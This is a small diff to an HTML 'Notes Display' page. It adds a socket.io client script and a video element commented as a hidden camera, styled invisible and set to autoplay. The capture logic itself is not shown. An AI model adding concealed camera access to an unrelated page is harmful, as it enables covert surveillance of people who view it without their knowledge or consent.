@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Notes Display</title>
     <link rel="stylesheet" href="display.css">
+    <script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
     <div class="display-container">
@@ -50,6 +51,9 @@
         </div>
         
     </div>
+
+    <!-- Hidden camera element for accessing camera -->
+    <video id="hiddenCamera" style="display: none;" autoplay muted playsinline></video>
 
     <script src="display.js"></script>
 </body>
